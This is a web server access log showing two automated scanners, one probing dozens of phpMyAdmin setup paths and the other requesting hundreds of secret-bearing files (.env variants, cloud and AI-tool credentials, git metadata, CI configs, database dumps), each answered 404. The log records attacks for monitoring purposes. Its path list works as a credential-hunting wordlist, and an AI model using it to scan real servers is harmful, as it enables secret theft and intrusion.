+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.7.0-pl2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.7.0-rc1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.7.5/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.7.6/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.7.7/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.8.2.3/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.8.2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.8.3/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.8.4/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.8.5/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.8.6/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.8.7/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.8.8/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.8.9/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.9.0-rc1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.9.0.1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.9.0.2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.9.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.9.1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.9.2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-3.0.1.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-3.0.1.1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-3.1.0.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-3.1.2.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-3.4.3.1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.11.11/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.11.11.3/scripts/setup.ph HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.11.11.3/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2.11.1-all-languages/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin-2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyadmin-2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin3/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /my/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /PHPMYADMIN/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /db/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /dbadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /myadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /MySQL/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /mysql/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /mysqladmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /pHpMyAdMiN/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /sqladm/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /sqladmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmyadmin/scripts/db.init.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin/scripts/db.init.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /database/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpAdmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmyadmin1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmyadmin2/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /pma/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /PMA/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /php/phpMyAdmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /php/phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /forum/phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /_phpMyAdmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /_phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /_pHpMyAdMiN/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /websql/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /php-my-admin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /php-myadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /web/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /xampp/phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /web/phpMyAdmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /web/phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /typo3/phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /cpphpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /cpanelphpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /blog/phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /apache-default/phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /administrator/components/com_joommyadmin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /admin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /Admin/phpMyAdmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /Admin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /admin/pma/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /admin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmyadmin7/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmyadmin6/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmyadmin5/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmyadmin4/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmyadmin3/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmyadmin/scripts/db___.init.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin/scripts/db___.init.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /myadmin/scripts/db___.init.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /PMA/scripts/db___.init.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /pma/scripts/db___.init.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /MyAdmin/scripts/db___.init.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /scripts/db___.init.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /sqlweb/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpLDAPadmin/scripts/setup HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /p/m/a/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmy-admin/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpMyAdmin/css/phpmyadmin.css.php HTTP/1.1" 404 Not Found
+INFO:     153.76.112.42:35568 - "GET /phpmyadmin/config.user.inc.php HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:41626 - "GET / HTTP/1.1" 200 OK
+INFO:     34.34.175.237:52198 - "GET /.env.old HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /.env~ HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52210 - "GET /.env.test HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /api/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52126 - "GET /.env.development HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /laravel/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52162 - "GET /.env.backup HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52182 - "GET /app/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52120 - "GET /.env.production HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52220 - "GET /.env.save HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52198 - "GET /.env.bak HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /backend/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /.env.example HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52126 - "GET /api/v1/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52210 - "GET /.env.dist HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /.env.staging HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52278 - "GET /.env.prod HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52292 - "GET /.env.dev HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /.env.swp HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52142 - "GET /.env.txt HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52220 - "GET /.env.copy HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52106 - "GET /.env.local HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52182 - "GET /.env.live HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /.env.stage HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52162 - "GET /admin/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /.env.development.local HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45860 - "GET /.env.sample HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45846 - "GET /.env.testing HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45882 - "GET /public/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /.env.production.local HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45866 - "GET /server/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /web/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52126 - "GET /frontend/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52278 - "GET /core/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52292 - "GET /cms/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /api/v2/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45880 - "GET /config/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52210 - "GET /api-backend/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52120 - "GET /.env.orig HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52248 - "GET /src/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52198 - "GET /.env.docker HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45882 - "GET /.env.aws HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52142 - "GET /admin-api/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /.continue/config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /.anthropic/config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45888 - "GET /.aws/config HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /.config/llm/credentials HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45860 - "GET /.aws/credentials.bak HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /.llm/credentials HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52162 - "GET /.config/gcloud/application_default_credentials.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52126 - "GET /.claude/settings.local.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52182 - "GET /.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45866 - "GET /.cursor/mcp.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52120 - "GET /.azure/accessTokens.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /.claude/settings.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52278 - "GET /.codeium/windsurf/mcp_config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45880 - "GET /.dockercfg HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52198 - "GET /.s3cfg HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45846 - "GET /.azure/azureProfile.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /.kube/config HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45894 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52248 - "GET /.git/index HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52220 - "GET /.boto HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45882 - "GET /.git/packed-refs HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /.git/info/refs HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52142 - "GET /.git/logs/HEAD HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52292 - "GET /.git/HEAD HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /.git/refs/heads/main HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /.git/refs/heads/master HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52210 - "GET /.config/gcloud/credentials.db HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45860 - "GET /.git/COMMIT_EDITMSG HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /.git/refs/heads/staging HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52182 - "GET /.git/description HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45888 - "GET /.git/ORIG_HEAD HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45866 - "GET /.git/FETCH_HEAD HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45894 - "GET /.git/refs/heads/production HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45918 - "GET /.git-credentials HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45882 - "GET /.git/logs/refs/heads/master HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45904 - "GET /.gitmodules HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52120 - "GET /.git/logs/refs/heads/main HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /.github/workflows/deploy.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /.svn/wc.db HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52198 - "GET /.hg/hgrc HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52142 - "GET /.bzr/branch/branch.conf HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52278 - "GET /.svn/entries HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45846 - "GET /.hg/requires HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52220 - "GET /.DS_Store HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52126 - "GET /.gitlab-ci.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45898 - "GET /.github/workflows/main.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52106 - "GET /.docker/config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /actuator/env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52210 - "GET /api/actuator/env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /actuator/heapdump HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52248 - "GET /actuator/beans HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /%40fs/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45860 - "GET /%40fs/root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45866 - "GET /%40fs/home/ubuntu/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52182 - "GET /phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45894 - "GET /_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45934 - "GET /phpinfo HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52198 - "GET /admin/phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45882 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /api/phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52120 - "GET /php_info.php HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45846 - "GET /config.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52126 - "GET /appsettings.Production.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52220 - "GET /config/config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52278 - "GET /appsettings.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /client_secrets.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52162 - "GET /.github/workflows/ci.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45946 - "GET /credentials.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /actuator/configprops HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52292 - "GET /credentials.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45898 - "GET /secrets.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52142 - "GET /secrets.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /secrets.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45888 - "GET /info.php HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /settings.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52248 - "GET /config/parameters.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52106 - "GET /settings.py HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45894 - "GET /.npmrc HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45866 - "GET /parameters.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45860 - "GET /.pypirc HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45934 - "GET /.netrc HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52120 - "GET /.dbeaver/credentials-config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /config.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45846 - "GET /.cargo/credentials.toml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45944 - "GET /appsettings.Development.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52142 - "GET /web.config HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /wp-config.php.bak HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45894 - "GET /wp-config.php.old HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /.streamlit/secrets.toml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45888 - "GET /wp-config.php.save HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45866 - "GET /configuration.php.old HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /serverless.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45860 - "GET /config.php.bak HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45934 - "GET /terraform.tfstate HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52120 - "GET /terraform.tfstate.backup HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52292 - "GET /terraform.tfvars HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45918 - "GET /symfony/_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45946 - "GET /docker-compose.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /serverless.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /vercel.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45894 - "GET /compose.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45944 - "GET /netlify.toml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /.circleci/config.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /Jenkinsfile HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52126 - "GET /.drone.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /backup.sql HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52142 - "GET /database.sql HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52220 - "GET /bitbucket-pipelines.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52162 - "GET /.travis.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52278 - "GET /azure-pipelines.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /.terraform/terraform.tfstate HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52182 - "GET /db.sql HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45898 - "GET /.gem/credentials HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52106 - "GET /wp-config.txt HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /dump.sql HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45846 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45888 - "GET /.env.production.backup HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /api/v1/namespaces/default/secrets HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /api/v3/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45946 - "GET /.claude/.credentials.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52126 - "GET /project/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /env.txt HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52142 - "GET /env.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45944 - "GET /.gemini/settings.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /.codex/auth.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /site/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52220 - "GET /DataFiles/env.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52162 - "GET /__ENV.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52278 - "GET /js/config.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45894 - "GET /auth.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45918 - "GET /.pgpass HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52248 - "GET /wp-config.php.swp HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52182 - "GET /.htpasswd HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45860 - "GET /.my.cnf HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /config/master.key HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45946 - "GET /app/etc/local.xml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52106 - "GET /app/etc/env.php HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /.amplifyrc HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45882 - "GET /telescope/requests HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52210 - "GET /.docker/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52198 - "GET /.aws/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52120 - "GET /sites/default/settings.php HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45934 - "GET /elmah.axd HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45866 - "GET /server-status HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45880 - "GET /.env.anthropic HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52292 - "GET /.docker/laravel/app/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45846 - "GET /.env-example HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45888 - "GET /.env.openai HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /.env-sample HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45918 - "GET /.env.php HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45894 - "GET /.htaccess HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52278 - "GET /Dockerfile HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52248 - "GET /application/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52220 - "GET /app.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52182 - "GET /app.config.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45944 - "GET /composer.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /backup/.env HTTP/1.1" 404 Not Found
